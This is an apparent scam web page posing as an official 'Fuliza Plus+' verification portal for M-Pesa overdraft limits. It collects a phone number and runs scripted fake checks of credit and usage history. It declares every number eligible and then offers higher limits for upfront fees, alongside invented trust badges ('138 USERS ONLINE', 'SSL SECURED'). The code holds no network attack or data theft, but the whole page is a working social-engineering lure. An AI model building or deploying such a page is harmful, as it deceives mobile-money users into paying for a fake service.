<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fuliza Plus+</title>

<style>
body{
  margin:0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
  background:#f2f4f7;
}

/* CENTER */
.container{
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

/* CARD */
.card{
  width:90%;
  background:#fff;
  padding:30px 20px;
  border-radius:25px;
  text-align:center;
  box-shadow:0 10px 40px rgba(0,0,0,0.08);
}

/* ICON */
.icon{
  width:80px;
  height:80px;
  margin:auto;
  border-radius:50%;
  background:#e6f4ea;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:35px;
  color:#1e8e3e;
}

/* TEXT */
h1{
  margin:15px 0 5px;
  font-size:24px;
}

.sub{
  color:#1e8e3e;
  font-size:13px;
  letter-spacing:1px;
  font-weight:600;
}

.desc{
  color:#777;
  font-size:14px;
  margin:15px 0 25px;
}

/* INPUT */
.input-box{
  display:flex;
  align-items:center;
  border:2px solid #1e8e3e;
  border-radius:15px;
  padding:12px;
}

.input-box span{
  margin-right:10px;
  color:#888;
}

.input-box input{
  border:none;
  outline:none;
  width:100%;
  font-size:15px;
}

/* BUTTON */
button{
  width:100%;
  margin-top:20px;
  padding:16px;
  border:none;
  border-radius:15px;
  background:#1e8e3e;
  color:#fff;
  font-size:16px;
  font-weight:bold;
}

/* FOOT */
.footer{
  margin-top:15px;
  font-size:12px;
  color:#888;
}

.dot{
  color:#1e8e3e;
  font-size:18px;
}

/* LOADER */
.loader{
  border:5px solid #eee;
  border-top:5px solid #1e8e3e;
  border-radius:50%;
  width:60px;
  height:60px;
  margin:auto;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}
</style>
</head>

<body>

<div id="app"></div>

<script>

const app = document.getElementById("app");

/* SCREEN 1 */
function home(){
  app.innerHTML = `
  <div class="container">
    <div class="card">

      <div class="icon">👤</div>

      <h1>Fuliza Plus+</h1>
      <div class="sub">OFFICIAL VERIFICATION PORTAL</div>

      <div class="desc">
        Verify your identity to unlock higher daily transaction limits.
      </div>

      <div class="input-box">
        <span>📞</span>
        <input id="phone" placeholder="Enter M-Pesa Number">
      </div>

      <button onclick="start()">Check My Eligibility</button>

      <div class="footer">
        <span class="dot">●</span> 138 USERS ONLINE &nbsp; | &nbsp; 🔒 SSL SECURED
      </div>

    </div>
  </div>
  `;
}

/* LOADING STEPS */
function start(){

  const phone = document.getElementById("phone").value || "07XXXXXXXX";

  steps([
    "Connecting...",
    "Verifying CRB Status...",
    "Finalizing Trust Score...",
    "Checking Usage History..."
  ], ()=>success(phone));
}

function steps(list, done){
  let i=0;

  function next(){
    if(i >= list.length){
      done();
      return;
    }

    app.innerHTML = `
    <div class="container">
      <div class="card">
        <div class="loader"></div>
        <h3 style="margin-top:20px;">${list[i]}</h3>
        <p style="color:#888;">Accessing secure databases...</p>
      </div>
    </div>
    `;

    i++;
    setTimeout(next, 2000);
  }

  next();
}

/* SUCCESS */
function success(phone){
  app.innerHTML = `
  <div class="container">
    <div class="card">
      <h2>✅ Congratulations!</h2>
      <p>${phone} is eligible for a boost</p>
      <button onclick="limits()">Proceed to Upgrade</button>
    </div>
  </div>
  `;
}

/* LIMIT SCREEN */
const data = [
["3,000","250"],["5,000","293"],
["7,500","350"],["10,000","500"],
["12,500","747"],["16,000","898"],
["21,000","1015"],["25,500","1220"],
["30,000","1533"],["35,000","1730"]
];

let selected="";

function limits(){

  app.innerHTML = `
  <div style="padding:10px;">
    <h3>Select Your New Approved Limit</h3>
    <div id="grid" style="
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:12px;
    "></div>

    <button id="btn" style="margin-top:20px;">
      SELECT A LIMIT
    </button>
  </div>
  `;

  const grid = document.getElementById("grid");

  data.forEach(d=>{
    let div=document.createElement("div");

    div.style = `
      background:#fff;
      padding:18px;
      border-radius:15px;
      text-align:center;
    `;

    div.innerHTML = `
      <b style="color:#1e8e3e;">Ksh ${d[0]}</b><br>
      <small>Fee: ${d[1]}</small>
    `;

    div.onclick=()=>{
      document.querySelectorAll("#grid div")
      .forEach(b=>b.style.border="none");

      div.style.border="2px solid #1e8e3e";
      selected=d[0];

      document.getElementById("btn").innerText =
      "UPGRADE TO KSH "+d[0];
    };

    grid.appendChild(div);
  });

  document.getElementById("btn").onclick=()=>{
    if(!selected){
      alert("Select amount first");
      return;
    }
    alert("Upgrade successful");
  };
}

/* INIT */
home();

</script>

</body>
</html>
